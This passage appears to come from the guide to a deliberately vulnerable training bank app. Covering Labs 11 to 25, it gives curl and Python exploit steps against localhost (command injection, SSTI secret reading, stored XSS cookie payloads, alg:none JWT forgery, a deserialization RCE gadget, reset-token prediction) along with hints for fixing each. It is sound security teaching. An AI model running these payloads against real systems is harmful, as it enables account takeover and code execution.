- SpEL has a way to say "use this value, do not evaluate it". Look for
  `setVariable` and the `#` prefix — that is the shape of the answer.
- The vulnerable path is `renderVulnerable(String)`. Replace its body with
  the constant-template version — the expression becomes a literal like
  `"#remark"`, and the caller's text is bound with
  `ctx.setVariable("remark", remark)`. (The intended fix deletes the
  vulnerable branch rather than adding a second one.)

---

### Lab 12 — SSTI + OS command injection: read the config and run commands `High`

**What it is.** This lab has **two** bugs in one report service, and they
are different bugs:

1. **Template injection** — the report *template* comes from the caller and
   is parsed as an expression. The template can read the application's
   internal configuration object, which holds the JWT secret and the
   database URL.
2. **Command injection** — the date filter is handed to the operating
   system as a **shell command line**. The dates are pasted into that
   string, so a quote character breaks out of the date argument and lets
   the caller run a command of their choosing.

The second one is the classic "shell metacharacters" bug. A shell splits
its command line on spaces, quotes and `;`, `&&`, `|`. If you build that
line by string-concatenating user data, the user gets to write part of it.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a05/ReportController.java` →
`generate(Map)` **and** `dateFilter(Map)`

**Exploit steps — part 1: read the internal config.**

```bash
curl -s -X POST http://localhost:8080/api/report/generate \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"account_id":"1001","template":"#root['\''Config'\'']['\''secretKey'\'']"}' \
  | python3 -m json.tool
```

**What you should see.** `report` contains `hardcoded-jwt-secret-...`.

**Exploit steps — part 2: run a command.**

```bash
curl -s -X POST http://localhost:8080/api/report/date-filter \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_date":"2024-01-01'\'' && id && echo '\''","to_date":"2024-12-31"}' \
  | python3 -m json.tool
```

**What you should see.** `command_output` contains `uid=...` — the output of
`id`. Your command ran on the server.

**Why it matters.** Command injection on a bank server is remote code
execution with the app's own privileges: read the database, read the
private keys, install a backdoor.

**Hint.** Two separate questions, because the fixes are independent.

**For the template:**

- Same shape as Lab 11. Which string is the *template* and which is the
  *data*? What should the template constant look like?
- Consider what the report actually needs to contain. It needs the
  *account id*. How do you get a value into a fixed template without
  evaluating the caller's text?
- The vulnerable path is `renderTemplateVulnerable(String)`. Replace its
  body with a constant template and bind the account id as a variable.

**For the command:**

- The core mistake is **building a command line as one string**. What if
  the program and its arguments were passed to the OS as *separate items*
  instead? Look for the API that takes a list of arguments.
- Separately: is the command even necessary? What is it trying to do with
  the dates? If it is converting a date string, does Java have a parser for
  that (`java.time`) that would fail cleanly on bad input instead of
  passing it to a shell?
- Two layers of defence: parse and validate the dates **before** you use
  them, *and* stop using a shell.
- The vulnerable path is `runShell(String)` — it hands a pre-built command
  *line* to a shell. The fixed version passes a list of arguments instead,
  with no shell involved.

---

### Lab 13 — Stored XSS: a transaction note is rendered as raw HTML `Medium`

**What it is.** **XSS** (cross-site scripting) means: your data came back
and the browser *ran* it as code. When a server builds HTML by pasting a
string into a template, and that string contains `<script>` or
`<img onerror=...>`, the browser parses it as markup rather than as text.

*Stored* XSS means the payload is saved in the database and fires for
**everybody** who later views the record — including bank staff using an
internal tool. In a real bank, a stored XSS in a transaction memo is a
session-hijacking primitive against the people who can move money.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a05/NoteRenderer.java` →
`render(String)`

There is exactly **one** server-side renderer, and it is what the
`GET /api/transfers/html` endpoint uses. That is deliberate: the endpoint
and the verification script can never disagree about what is rendered.

> **But the React UI does *not* use it.** `TransfersPage.tsx` fetches the raw
> JSON from `GET /api/transfers/history` and injects `t.note` with
> `dangerouslySetInnerHTML` directly. So the browser has its own rendering
> path, separate from `NoteRenderer`.
>
> This matters for your fix: escaping in `NoteRenderer` makes
> `GET /api/transfers/html` safe and flips the harness to `FIXED`, but the
> React page is still injecting the raw note. **Fix the renderer *and* the
> React component**, or the browser remains vulnerable while the check
> reports success.

**Exploit steps.**

1. Store a payload in a transfer note:
   ```bash
   curl -s -X POST http://localhost:8080/api/transfers/send \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"from_account_id":1,"to_account_id":2,"amount":0.01,
          "note":"<img src=x onerror=alert(document.cookie)>"}' \
     | python3 -m json.tool
   ```
2. Read the notes back as HTML:
   ```bash
   curl -s http://localhost:8080/api/transfers/html \
     -H "Authorization: Bearer $TOKEN" \
     -H "Accept: text/html"
   ```
   The endpoint declares `produces = text/html` and takes no parameters, so
   it renders the transfers the caller can see — but it will only serve
   that representation. **The `Accept: text/html` header is required.**

   > Without it, `curl` sends `Accept: */*` and Spring still refuses to
   > negotiate, answering `HTTP 500` with
   > `HttpMediaTypeNotAcceptableException: No acceptable representation`.
   > That is a *representation* error, not a fixed lab — if you see it, add
   > the `Accept` header rather than assuming you have fixed something.
   > (Sending `Accept: application/json` fails the same way.)
3. Or open the Transfers page in the browser. The React app injects the
   note with `dangerouslySetInnerHTML`, which is exactly the "render this
   string as HTML" instruction.

**What you should see.** The raw `<img src=x onerror=...>` in the response,
unescaped. In the browser, the alert fires.

**Why it matters.** The payload runs in the victim's session, with the
victim's cookies, on the bank's own origin.

**Hint.** The question is not "should we block `<script>`" — a blocklist
loses, again. The question is: **what should the server send?**

- If the note is meant to be *text*, then the HTML that reaches the browser
  must contain the note's `<` and `>` in a form the browser will read as
  text, not as markup. Which characters need that treatment, and is there
  a helper in the JDK or Spring that does exactly this?
- Where should the escaping happen — in the renderer, or in the React
  component? Think about *every* consumer of that string. `TransfersPage.tsx`
  uses `dangerouslySetInnerHTML`, so React will not protect you, and the
  server is the only place that can — **but** the React component still
  needs to stop injecting raw markup, or the browser stays vulnerable
  even after the server-side fix.

---

## A06 — Insecure Design

*A06 is different from the rest. The code may be perfectly written, with
no injection and no missing check — and the system can still be wrong. These
bugs are about the **rules of the business** and the **shape of the
design**, and no input filter will save you.*

---

### Lab 14 — Negative transfer: the amount is applied without validation `Medium`

**What it is.** A transfer has a *from* account, a *to* account and an
*amount*. The obvious rule is "the amount must be positive". If nothing
checks that, then the sign of the amount stops meaning anything: the code
applies the same `amount` to **both** sides without checking it, so a
transfer of **−1000** takes £1,000 away from the sender *and* £1,000 away
from the recipient.

The total money in the system therefore **changes**, which is the invariant
that must never break. A bank balance is not a number you can subtract
from twice.

This is a **business logic** bug. There is no attacker trick here, only a
missing rule.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a06/TransferService.java` →
`send(...)`

**Exploit steps.**

1. Read alice's balance:
   ```bash
   curl -s http://localhost:8080/api/accounts/1 -H "Authorization: Bearer $TOKEN" \
     | python3 -m json.tool
   ```
2. Send a negative transfer:
   ```bash
   curl -s -X POST http://localhost:8080/api/transfers/send \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"from_account_id":1,"to_account_id":2,"amount":-1000,"note":"lab 14 probe"}' \
     | python3 -m json.tool
   ```
3. Read alice's balance again — and bob's, too.

**What you should see.** Alice's balance goes **down** by £1,000: £4,200
becomes £3,200. Bob's balance goes **down** by £1,000 as well: £12,800
becomes £11,800. The transfer records a "completed" £1,000 transfer, and
yet £1,000 of money has **vanished** from the system rather than moving
between the two accounts. £1,000 was destroyed by a transfer that claims to
have moved it.

> The direction surprises people, so read it carefully: the amount is added
> to both sides, so a **negative** amount takes money from *both*. The
> exploit is not that alice gains money — it is that the total changes at
> all, and that the sender can be debited without limit.

**Why it matters.** It defeats the bank's core invariant: the total amount
of money in the system must not change. A rule that a customer can invert
is a rule that does not exist.

**Hint.** This one is short and the fix is short too. Where in `send(...)`
should the amount be checked, and what should happen when the check fails?

Think about which of these the bank actually needs, and note that the
harness accepts a `400` **or** a `422`:
- amount strictly greater than zero?
- amount less than the sender's balance?
- amount that is a whole number of pence, with no sub-penny rounding?
- amount below some per-transfer limit?

The project already has an error type for "that request was malformed" —
it is `TransferService.TransferException`, the type this very method
throws, and `TransferController` already maps it to `400`.

> **Note on balances.** This lab moves real money in the database. The
> harness puts it back afterwards, and the seed restores balances on every
> boot. But if you are checking by hand, run `POST /api/lab/reset` (or
> restart the app) before you trust a balance reading.

---

### Lab 15 — Mass assignment: promote yourself to admin `Medium`

**What it is.** The `PATCH /api/profile` endpoint takes a JSON body and
updates *your* profile. The bug is that it applies **every field in the
body** to the user record — including fields the UI never sends, like
`role`, `id` and `password_hash`.

This is **mass assignment** (also called *over-posting*). The client is
trusted to decide which fields to write. A client that sends
`{"role":"admin"}` writes the role column.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a06/ProfileController.java` →
`update(Map)`

**Exploit steps.**

1. Log in as alice and get her token.
2. Send a profile update that includes a role:
   ```bash
   curl -s -X PATCH http://localhost:8080/api/profile \
     -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
     -d '{"email":"alice@bank.com","full_name":"Alice Anderson","role":"admin"}' \
     | python3 -m json.tool
   ```
3. Read the profile back, or call the admin API:
   ```bash
   curl -s http://localhost:8080/api/admin/users -H "Authorization: Bearer $TOKEN" \
     | python3 -m json.tool
   ```

**What you should see.** `"role": "admin"`. Your customer account is now an
admin account, and Lab 2's exploit now works with your own legitimate
token.

**Why it matters.** An endpoint that trusts the client's field list is an
endpoint whose security depends on every client being honest — including
the ones you did not write.

**Hint.** The vulnerable path is `applyAllFields(User, Map)`. Read it and
notice what it does: it walks the client's body and writes *every* key it
finds onto the entity.

The idea in one sentence: **the server decides which fields may be written,
not the client.**

- Which fields does a customer legitimately own? (Probably `email` and
  `full_name`. Never `role`, `id`, `username` or `password_hash`.)
- What happens if the body contains a key you do not recognise — is it
  ignored, or applied?
- Should a role change even be *possible* here? Where should it live
  instead?

---

### Lab 16 — Account enumeration `Low`

**What it is.** The login endpoint returns two *different* error messages:

- `"User not found"` — when the username does not exist
- `"Incorrect password"` — when the username exists but the password is wrong

The difference is a **username oracle**. An attacker can use it to build a
list of valid usernames before ever attacking a password — and on its own
it is often enough to target the right person for a phishing campaign or a
credential-stuffing run.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a07/AuthController.java` →
`failure(String)`

**Exploit steps.**

```bash
# A username that does not exist
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"notauser","password":"whatever"}'; echo

# A username that does exist, wrong password
curl -s -X POST http://localhost:8080/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"definitely-wrong"}'; echo
```

**What you should see.** Two `401`s with *different* bodies.

**Why it matters.** Cheap to fix, and it costs the attacker nothing if you
leave it. Every account you have confirmed exists is an account that will
be targeted.

**Hint.** The fix is to make the two responses **identical** — same status
code, same message, same body, same timing as far as is reasonable.

- What single message covers both cases?
- Watch out for the *other* leak: the two responses must not differ in
  anything else either. The harness compares the whole body, so watch for
  extra fields in one response.
- Timing is the subtler version of the same leak (a "user not found"
  reply that returns instantly, versus one that hashes a password first).
  Does the current code do the work in the same order in both cases?

---

## A07 — Identification and Authentication Failures

*A07 is about proving who you are. "Did you send the right password?" is
only one of the questions in this category — there are also questions about
*how many times* you may guess, *what session* you get afterwards, and
*how do you recover a lost password*.*

---

### Lab 17 — Brute force: the login never locks you out `Low`

**What it is.** A brute-force attack is simply "try every password until one
works". It works whenever the server lets you try unlimited times, fast.
This login endpoint has no rate limiting, no lockout, and no delay.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a07/LoginAttemptService.java`
plus `backend/src/main/java/com/securebank/labs/a07/AuthController.java` →
`login(...)`

**Exploit steps.**

1. Time a hundred failed attempts:
   ```bash
   time (for i in $(seq 1 100); do
     curl -s -o /dev/null -X POST http://localhost:8080/api/auth/login \
       -H "Content-Type: application/json" \
       -d '{"username":"brute-force-probe","password":"wrong'"$i"'"}'
   done)
   ```
   Note the wall-clock time: a fraction of a second for a hundred
   attempts.
2. Now do the same against a real account — `alice` — and watch nothing
   change: no lockout, no slowdown, no CAPTCHA, no alert.

**What you should see.** All attempts return `401` immediately. The account
is still usable afterwards.

**Why it matters.** Combined with Lab 16 (which tells you which usernames
exist) and Lab 7 (which tells you the passwords are weak), this is a
complete, automated account-takeover chain.

**Hint.** The `LoginAttemptService` class already exists and is already
injected into the login controller. What it needs is for somebody to
actually **use** it — look at the methods it offers (`isBlocked`,
`recordFailure`, `recordSuccess`, and `failureCount`) and decide where in
`login(...)` each one belongs. The class also declares `MAX_ATTEMPTS`,
`LOCKOUT_SECONDS` and a `TooManyAttemptsException`, so the intended
behaviour is already written down.

Then think about the design questions:

- What is counted — failures per *username*, per *IP address*, or both?
  (Per username alone lets an attacker lock out a victim. Per IP alone
  lets them use a botnet.)
- How many failures before the lock, and how long does it last?
- Does a **successful** login clear the counter? (If not, five correct
  logins in a row would lock a legitimate user out.)
- Should the counter be *stored* or in memory? (In memory it resets when
  the app restarts — and in a multi-instance deployment each instance
  keeps its own count.)

---

### Lab 18 — Session fixation `Medium`

**What it is.** This endpoint uses a **session cookie** rather than a bearer
token. Sessions work like this: you visit the site, the server gives you an
id (`JSESSIONID`), and you present it on every request.

Session fixation is an attack on that id. The attacker gets a valid session
id *first* — by visiting the site themselves — and then plants it in the
victim's browser (via a shared computer, or via a stored XSS like Lab 13).
When the victim logs in, the server issues a **new** session id to the
victim, but if it does not also **invalidate the old one**, the attacker's
id is still valid — and now it is authenticated.

The fix is one line of intent: **the session id must change when the
authentication level changes.**

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a07/SessionLoginController.java`
→ `loginSession(Map, HttpServletRequest)`, and the session security
settings in `SecurityConfig`.

**Exploit steps.**

1. Get a session id, the way an attacker would — just visit:
   ```bash
   curl -s -c /tmp/jar.txt http://localhost:8080/api/session/start
   grep JSESSIONID /tmp/jar.txt
   ```
2. Log in while *presenting* that id:
   ```bash
   curl -s -b /tmp/jar.txt -c /tmp/jar.txt \
     -X POST http://localhost:8080/api/auth/login-session \
     -H "Content-Type: application/json" \
     -d '{"username":"alice","password":"password123"}' | python3 -m json.tool
   ```
   Look at the `session_id` in the response.
3. Try the **original** id against an authenticated endpoint:
   ```bash
   curl -s -b "JSESSIONID=<the-original-id>" \
     http://localhost:8080/api/session/whoami | python3 -m json.tool
   ```

**What you should see.** Step 2's `session_id` is **identical** to the
original id, and step 3 returns alice's identity with `HTTP 200`. The
planted id authenticates.

**Why it matters.** The attacker ends up logged in as the victim without
ever knowing the victim's password.

**Hint.** Spring Security has a built-in protection for exactly this,
called **session fixation protection**, and it is *on by default*. This
project deliberately turns it off — look in `SecurityConfig` for the
session chain and find where it is disabled, and what the comment there
says the fix is.

The conceptual question to answer: **when** should the session id change?
(When the user's authentication level changes — logging in, logging out,
or switching identity. Not on every request, or nothing would work.)

---

### Lab 19 — Predictable password reset token `High`

**What it is.** Password reset is the classic "prove you own the account
without the password" flow. The server emails the user a **token**; the
user hands it back; the server changes the password.

The token must therefore be **unguessable**. This one is
`md5(username + unixTimestamp)` — computable by anyone who knows the
username and roughly what time it is. The MD5 is only there to *look* like
a hash; it adds no secrecy, because the input space is tiny.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a07/AuthController.java` →
`resetRequest(Map)`

**Exploit steps.**

1. Ask for a reset and see the token:
   ```bash
   curl -s -X POST http://localhost:8080/api/auth/reset-request \
     -H "Content-Type: application/json" \
     -d '{"username":"carol"}' | python3 -m json.tool
   ```
2. Look at the `token` field — it is in the response **for lab
   convenience**.
3. Now *compute* one without asking:
   ```bash
   python3 - <<'PY'
   import hashlib, time
   username = "carol"
   for offset in range(-30, 31):
       ts = int(time.time()) + offset
       print(ts, hashlib.md5(f"{username}{ts}".encode()).hexdigest())
   PY
   ```
   Try the candidates against `/api/auth/reset-confirm` until one is
   accepted:
   ```bash
   curl -s -X POST http://localhost:8080/api/auth/reset-confirm \
     -H "Content-Type: application/json" \
     -d '{"token":"<a computed token>","new_password":"hacked"}' | python3 -m json.tool
   ```
4. Log in as carol with the new password.

**What you should see.** `{"message":"Password updated"}` — with a token
you computed yourself, for an account you never emailed.

**Why it matters.** Password reset is the most common account-takeover
route in the wild, precisely because it is the one flow where the user
expects to be told a secret.

**Hint.** Two separate problems, and both need fixing:

1. **The token must be unpredictable.** Where should the randomness come
   from? (Not a hash of something the attacker knows. Look for a
   cryptographically secure random generator — `java.security.SecureRandom`,
   or `java.util` token helpers.) How many bits of entropy does your token
   need to have? (Consider that the token is sent over email, so it may be
   typed by hand — is base64 with `+` and `/` a good idea?)
2. **The token must be single-use and time-limited.** What stops the same
   token being redeemed twice — say, by whoever intercepted it? The
   `PasswordResetToken` entity already has `used` and `expiresAt` fields,
   and `resetConfirm` already checks them. So what is *actually* missing?

There is also a third issue worth checking — but note that this one is
**already handled**. The reset **request** response returns the same message
("If that account exists, a reset link has been sent.") whether or not the
account exists, so it does not leak account enumeration. Verify that with
two requests — one real username, one fake — and if the messages differ,
that is a regression worth reporting rather than something left to fix.

---

## A08 — Software and Data Integrity Failures

*A08 is about trusting things that arrive with instructions attached — code,
not data. "The file" is not data if the file can name a class to instantiate
or a page to render. "The token" is not trustworthy if the server does not
check how it was signed.*

---

### Lab 20 — Unsafe deserialization → remote code execution `Critical`

**What it is.** Java's native serialisation format is powerful: the byte
stream literally **names the classes to construct**, and the data carries
their field values. When the server calls `readObject()`, it constructs
whatever the stream asked for — and some classes do dangerous work *in
their constructor or their `readObject` method*.

This is why the lab ships an in-app class, `ImportPayload`, whose
`readObject` runs a command. In the wild, attackers use "gadget chains" —
innocent-looking JDK classes that, when deserialized in the right order,
end up executing a command.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a08/IntegrityController.java` →
`importAccount(MultipartFile)`, and the gadget at
`backend/src/main/java/com/securebank/labs/a08/ImportPayload.java`

**Exploit steps.**

1. Compile the app (the payload generator needs the app's classes on its
   classpath):
   ```bash
   cd backend && ./mvnw -q -o compile && cd ..
   ```
2. Build the payload. The generator is
   `verify/payloads/MakeImportPayload.java` — it is a small Java program
   that serialises the lab's `ImportPayload` gadget:
   ```bash
   mkdir -p /tmp/lab20
   javac -cp backend/target/classes -d /tmp/lab20 \
     verify/payloads/MakeImportPayload.java

   java -cp backend/target/classes:/tmp/lab20 \
     MakeImportPayload /tmp/payload.bin "id"
   ```
   It prints `wrote /tmp/payload.bin (N bytes)`.
3. Upload it:
   ```bash
   curl -s -X POST http://localhost:8080/api/integrity/import-account \
     -H "Authorization: Bearer $TOKEN" \
     -F "file=@/tmp/payload.bin" | python3 -m json.tool
   ```
4. Look at the app's log — the command ran.

**What you should see.** `HTTP 200` with
`"type": "com.securebank.labs.a08.ImportPayload"`, and the `id` output in
the backend log.

> The harness proves this lab with a **marker file** rather than with the
> response body — the payload's command touches a file, and the harness
> checks the filesystem for it. A response body can be faked by an app that
> simply ignored the upload; a file that appeared on disk cannot.

**Why it matters.** Upload a file → run code on the server. It is about as
direct a path to RCE as an application can have.

**Hint.** There are two levels of fix, and the strong one is much simpler
than it looks.

1. **Do not deserialize untrusted bytes at all.** What is this endpoint
   actually for? (Importing an account.) What data-only format describes an
   account? (JSON or CSV.) If the bytes are parsed as JSON, they can describe
   an account but they **cannot name a class** — and nothing in the file can
   become code. The vulnerable path is `importAccount(MultipartFile)`; replace
   its body so it parses the bytes as JSON instead of handing them to
   `ObjectInputStream`.
2. **If you must deserialize, constrain the stream.** Java has
   `ObjectInputFilter`, which lets you allowlist the classes the stream is
   permitted to construct. Anything not on the list is rejected *before* it
   is instantiated.

Ask yourself which of the two you would choose in production, and why
"allowlist" beats "blocklist" here.

---

### Lab 21 — JWT `alg:none` — forge an admin token with no key at all `Critical`

**What it is.** Recall that a JWT is `header.payload.signature`. The
`header` says which algorithm was used — `HS256` (a symmetric HMAC) or
`RS256` (an asymmetric RSA). A classic *algorithm confusion* attack is to
change the header to say `"alg":"none"` — "no signature required" — and
send a token with an **empty** signature segment.

A correct verifier must refuse: if the header says `none`, there is no
signature to check, so the token is not authenticated at all. This app's
hand-rolled parser never looks at the `alg` field and never verifies the
signature.

**Where it lives.**
`backend/src/main/java/com/securebank/security/LabJwtService.java` →
`parse(String)`

**Exploit steps.**

1. Build an unsecured token:
   ```bash
   NONE=$(python3 - <<'PY'
   import base64, json
   def b64(raw): return base64.urlsafe_b64encode(raw).decode().rstrip("=")
   head = {"alg":"none","typ":"JWT"}
   pay  = {"user_id":1,"username":"admin","role":"admin"}
   print(f"{b64(json.dumps(head,separators=(',',':')).encode())}.{b64(json.dumps(pay,separators=(',',':')).encode())}.")
   PY
   )
   ```
2. Use it:
   ```bash
   curl -s http://localhost:8080/api/admin/users -H "Authorization: Bearer $NONE" \
     | python3 -m json.tool
   ```

**What you should see.** `HTTP 200` with the whole user list. No secret was
needed, no password, no signature.

**Why it matters.** This is a different bug from Lab 8 — the secret is
irrelevant here. Even after you rotate the secret perfectly, `alg:none`
still works. That is why the two labs are separate: **fixing one does not
fix the other.**

**Hint.** The project already has the correct answer available. jjwt is on
the classpath, and jjwt's `parseSignedClaims` **requires a signature** —
it will refuse an unsecured token, and it will refuse a token whose
algorithm is not the one you configured.

Look at `backend/src/main/java/com/securebank/security/SecureJwtService.java`
— that is the reference implementation of a verifier done properly.

The questions:

- Why is a hand-rolled JWT parser a bad idea in the first place? (It is
  a security protocol, and security protocols have a lot of edge cases.)
- What is the *minimum* a verifier must check? Consider: the algorithm the
  token claims to use, the algorithm the server expects, and whether a
  signature is present **at all**.
- Watch the boundary between Lab 21 and Lab 25. Lab 25's fix makes the
  filter return `401` on a malformed token — but the parser must still
  distinguish "this token is malformed" from "this token has a bad
  signature". If Lab 25's fix swallows a `alg:none` token too, Lab 21 will
  silently un-fix itself.

---

### Lab 22 — Unrestricted file upload: your file, your name, served as HTML `High`

**What it is.** The "upload your KYC documents" feature takes the file the
client uploaded and writes it into the site's own static folder, keeping
the client's filename and extension. Two things go wrong at once:

1. **The name is the client's.** `../../etc/passwd` or a name that overwrites
   another file are both possible.
2. **The location is the web root.** A file served from your own origin
   runs with your origin's privileges. Upload a `.html` file containing
   `<script>`, and the browser executes it *on your domain* — same-origin
   access to your cookies and session.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a08/IntegrityController.java` →
`kycUpload(MultipartFile)`

**Exploit steps.**

1. Create an HTML file:
   ```bash
   cat > /tmp/kyc-evidence.html <<'EOF'
   <html><body>
   <h1>securebank-upload-probe</h1>
   <script>alert(document.domain)</script>
   </body></html>
   EOF
   ```
2. Upload it:
   ```bash
   curl -s -X POST http://localhost:8080/api/integrity/kyc-upload \
     -H "Authorization: Bearer $TOKEN" \
     -F "file=@/tmp/kyc-evidence.html" | python3 -m json.tool
   ```
3. Fetch it back and watch it come back as HTML:
   ```bash
   curl -s http://localhost:8080/api/integrity/uploads/kyc-evidence.html \
     -H "Authorization: Bearer $TOKEN"
   ```
   Or open that URL in the browser and watch the alert fire.

**What you should see.** `HTTP 200` with `"stored_as":"kyc-evidence.html"`
and `"location":"/uploads/kyc-evidence.html"` from the upload call, and the
file itself served back as `text/html` — the `<script>` runs.

> **The `location` field lies.** It says `/uploads/kyc-evidence.html`, but
> that path is **not served** — requesting it returns `401` without a token
> and `500` with one, because the `uploads/` directory is not a static
> resource root in this build. The endpoint that really hands the bytes
> back is `GET /api/integrity/uploads/{name}`, which is what the harness
> reads. Use that one.
>
> The flaw is unchanged either way: the **client's** filename and extension
> were trusted, and the bytes were written where the server will serve
> them back as HTML. That is the bug you are here to fix.

**Why it matters.** An upload endpoint that serves your bytes back from
your own origin is a stored-XSS machine with a public filename.

**Hint.** Three questions, and the vulnerable path `kycUpload(MultipartFile)`
has an answer to all three:

1. **Who names the file?** The client should not. What should the stored
   name be — and where should the *original* name live instead?
2. **Where does the file go?** "Somewhere the web server will not serve."
   What directory should that be, and what is the current one? (The
   vulnerable branch writes into `UPLOAD_DIR`, which is the relative path
   `uploads` — resolved against the backend's working directory, i.e.
   `backend/uploads/`. The fixed version writes to `var/kyc/`.)
3. **What extension does it get?** If the name is generated by the server,
   the extension is generated too. Should an uploaded file keep the
   client's extension at all?

And one more: **what is the content type of the response?** Even a
correctly-named file can be dangerous if it is served as `text/html`. How
does the server decide what content type to send? (Look at
`contentTypeFor(String)` — it maps the extension to a MIME type, and it is
what decides how the browser treats the bytes.)

> Do not be misled by the `location` field the vulnerable branch returns
> (`/uploads/<name>`). In this build that URL is not served — the
> `uploads/` directory is not a static resource root. The bytes come back
> from `GET /api/integrity/uploads/{name}`, which infers the content type
> from the extension. That endpoint is what the harness reads, and it is
> what makes the `.html` upload dangerous.

---

## A10 — Mishandling of Exceptional Conditions

*A10 is about what happens when something goes wrong. The rule that ties
all three labs together: **when the unexpected happens, the safe default is
to refuse — not to reveal, and not to continue as if nothing happened.***

---

### Lab 23 — Verbose error: the stack trace tells the attacker how the app works `Low`

**What it is.** This endpoint takes an account id as a **string** and
converts it to a number. If the string is not a number, Java throws
`NumberFormatException`. If nothing catches it, Spring's default error page
renders the **stack trace** back to the client.

A stack trace is not just noise. It tells an attacker your Spring version,
your package names, your class and method names, and the exact line that
threw — which is a map of your code and a hint about what to attack next.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a10/VerboseErrorController.java`
→ `summary(String)`, plus the `server.error.include-*` settings in
`backend/src/main/resources/application.yml`

**Exploit steps.**

```bash
curl -s "http://localhost:8080/api/transfers/account-summary?id=abc" \
  -H "Authorization: Bearer $TOKEN" | head -40
```

**What you should see.** `HTTP 500` and a body containing
`java.lang.NumberFormatException`, `at com.securebank...`, `at java.base/...`
and `org.springframework...`.

**Why it matters.** Error messages are free reconnaissance. And "I sent
garbage and the server told me its entire internal call stack" is not a
reassuring thing to see in a production system.

**Hint.** Two layers, and you want both:

1. **Validate the input before you use it.** This is the real fix. The
   endpoint knows what a valid account id looks like — so what should it do
   when the value is not one? (Return `400` or `422` with a short message.)
   Which project type represents "the client sent something invalid"?
2. **Stop the framework from rendering internals.** `application.yml` sets
   `include-stacktrace`, `include-message` and `include-exception` to
   `always`. What should they be?

Also worth asking: what does the `core/ApiExceptionHandler` do, and is
there a pattern in this project for turning an exception into a clean
client-facing response?

> **Careful with Lab 24.** Lab 24 has its *own* exception handler, on
> purpose, so that the two fixes stay independent. Fixing Lab 23 must not
> accidentally "fix" Lab 24 (or vice versa) — check both afterwards with
> `python3 verify/run.py --lab 23` and `--lab 24`.

---

### Lab 24 — Type coercion leaks the object model `Medium`

**What it is.** This endpoint takes a transfer body with a typed `amount`
field. You send the *string* `"notanumber"` where a number belongs. The
JSON deserializer tries to coerce it, fails, and throws — and the error
message names the **target type** (`BigDecimal`), the **field**, the
**value you sent**, and the **application's own class path**.

A deserialization error is supposed to be a helpful developer message. In
production it is a schema of your internals, delivered on demand.

**Where it lives.**
`backend/src/main/java/com/securebank/labs/a10/CoercionController.java` →
`handleUnreadable(HttpMessageNotReadableException)`

**Exploit steps.**

```bash
curl -s -X POST http://localhost:8080/api/transfers/typed-send \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"from_account_id":1,"to_account_id":2,"amount":"notanumber","note":"lab 24 probe"}' \
  | head -40
```

**What you should see.** `HTTP 400` (or `500`) with a body containing
`BigDecimal`, `java.math`, `com.securebank`, `TransferRequest`,
`through reference chain`, `notanumber`, and `tools.jackson` — the whole
internals of your data model.

**Why it matters.** This is reconnaissance with a query interface. An
attacker can map your DTOs, your field types, your framework version and
your package layout, and then aim the *next* exploit.

**Hint.** The interesting detail is that this lab has its **own**
`@ExceptionHandler` — separate from the global one in `core/`. That is
deliberate, so the two A10 labs can be fixed independently.

- What should the handler return? (A short, generic message. Something like
  "the request body could not be read" — and *nothing* else.)
- What status code? (The client sent something malformed, so `400`.)
- The exception object you receive carries the detailed message. Do you
  need to pass any of it to the client? (No. Log it server-side if you
  want it — but log it to the *server*, not to the response.)
- Look at how the global handler in `core/ApiExceptionHandler.java` is
  written — is there a pattern here to copy?

---

### Lab 25 — Fail-open authentication: a token that names nobody becomes admin `Critical`

**What it is.** This is the most important lab in the set, and the one
that has caused the most real breaches.

The API accepts bearer tokens. A token can name a **user** (`user_id`,
`role`, `username`) — but it can also name **no one**. This app issues
exactly such tokens: `POST /api/service/token` mints a token for a
*service* (a batch job, a webhook, a partner integration). That token is
perfectly validly signed and perfectly valid — it simply does not say who
you are.

The bug is in what the filter does next. When the token names nobody, the
code **falls through to a default identity** — `user_id = 1`, which is the
admin — instead of rejecting the request.

**Fail open** means: *when in doubt, let it in.* The safe default is
**fail closed**: *when in doubt, refuse.*

**Where it lives.**
`backend/src/main/java/com/securebank/security/LabAuthFilter.java` →
`doFilterInternal(...)`

**Exploit steps.**

1. Mint a service token (a token that names no user):
   ```bash
   SERVICE=$(curl -s -X POST http://localhost:8080/api/service/token \
     -H "Content-Type: application/json" \
     -d '{"service":"batch-settlement"}' \
     | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
   ```
2. Use it against the admin API:
   ```bash
   curl -s http://localhost:8080/api/admin/users \
     -H "Authorization: Bearer $SERVICE" | python3 -m json.tool
   ```

**What you should see.** `HTTP 200` with the full user list. The service
token became an admin session.

**Why it matters.** This is the shape of the bug that keeps producing
breaches: a `catch` block that swallows an error and continues with a
sensible-looking default. The default was sensible for the *code* (it needs
*some* user id) and catastrophic for the *security*.

**Hint.** The fix is small; the *reasoning* is the point.

- What should the filter do when the token is valid but names no user?
  (Return `401`. There is no identity, so there is no authoriser.)
- Look at the class carefully. There is exactly **one** place that invents
  an identity: the block near the end of `doFilterInternal` that says
  `if (userId == null && header != null && header.startsWith("Bearer "))`
  and then sets `userId = 1L; role = "admin"; username = "admin";`. **That
  block is the bug.** Delete it — or make it refuse — and the filter falls
  through unauthenticated, which is correct.
- The two `catch` blocks above it are **not** the bug. Both of them already
  call `unauthorized(res)` and `return`. They are what keeps Lab 21 and
  Lab 25 independent, so leave them alone.
- Note the scoping: the fail-open block is only reachable when the request
  carried an `Authorization: Bearer ` header. A request with no
